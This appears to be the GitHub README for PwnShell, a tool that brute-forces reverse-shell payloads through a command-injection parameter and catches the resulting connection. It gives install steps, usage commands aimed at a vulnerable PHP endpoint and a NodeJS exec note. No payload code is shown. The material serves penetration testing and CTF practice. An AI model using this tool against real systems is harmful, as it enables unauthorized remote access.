

# PwnShell

### PwnShell is a Powerfull RevShell Bruteforcer and Connection Handler built For Security Researchers and CTF Players!

![Alt text](https://github.com/zAbuQasem/PwnShell/blob/main/Screenshots/PwnShell.png)

<a href="#getting-started">Installation</a>
    </li>
    <li><a href="#usage">Usage</a></li>
    <li><a href="#license">License</a></li>
    <li><a href="#contact">Contact</a></li>
    <li><a href="#acknowledgements">Acknowledgements</a></li>
  </ol>
</details>

## Installation

1. Clone the repo
   ```sh
   git clone https://github.com/zAbuQasem/PwnShell
   ```
2. Install the dependencies
   ```sh
   cd PwnShell/
   pip install -r requirements.txt
   ```
3. Make the script executable 
   ```sh
   chmod +x pwnshell.py
   ```

<!-- USAGE EXAMPLES -->
## Usage
### Request-File Method [Recommended] 👇
```sh
./pwnshell.py -H [HOST IP] -f [REQUEST FILE]
```
#### Example:
-Copy from Burp or Network tab

-Replace the Vulnerable parameter with 'PWNME'
```sh
GET /Vulnerable.php?cmd=PWNME HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
```
### URL Method 👇
```sh
./pwnshell.py -H [HOST-IP] -u [TARGET-URL] -m [REQUEST-METHOD] -c [COOKIE (optional)] -k [HEADERS (optional)]

#Note: Cookie and headers must be in JSON format (if provided).
   ```
```sh
./pwnshell.py -H <HOST-IP> -u http/s://<TARGET>/Vulnerable.php?cmd=PWNME --method GET --cookie '{"key" : "value"}' 
```
#### Example:
-Replace the Vulnerable parameter with 'PWNME'
```sh

./pwnshell.py -H 127.0.0.1 -u http://10.10.10.10/vulnerable.php?cmd=PWNME
```

### For NodeJs Payloads 
```sh
./pwnshell.py -H [HOST-IP] -n   
  
#To use only -> require('child_process').exec('Payload')
```
## Preview
### Using [Request-File Method]
![Alt text](https://github.com/zAbuQasem/PwnShell/blob/main/Screenshots/requestfile-demo.gif)

### Using [URL Method]
![Alt text](https://github.com/zAbuQasem/PwnShell/blob/main/Screenshots/url-demo.gif)
   


## License

Distributed under the MIT License. See `LICENSE` for more information.



<!-- CONTACT -->
## Contact

**Zeyad AbuQasem** - [LinkedIn](https://www.linkedin.com/in/zeyad-yahya-0985971b5/)

**Omar Albalouli** - [LinkedIn](https://www.linkedin.com/in/omar-albalouli/)

**Project Link**: [https://github.com/zAbuQasem/PwnShell](https://github.com/zAbuQasem/PwnShell)



<!-- ACKNOWLEDGEMENTS -->
## Acknowledgements
* [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
* [LinEnum](https://github.com/rebootuser/LinEnum)
* [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)
* [Docker Privesc Script](https://github.com/flast101/docker-privesc)
* [SUID3NUM](https://github.com/Anon-Exploiter/SUID3NUM)
* [Burpee](https://github.com/xscorp/Burpee)

### TODO:
```sh
1- Add support for windows
2- Add more payloads and options
3- Add Post exploitation scripts for [linux/windows]
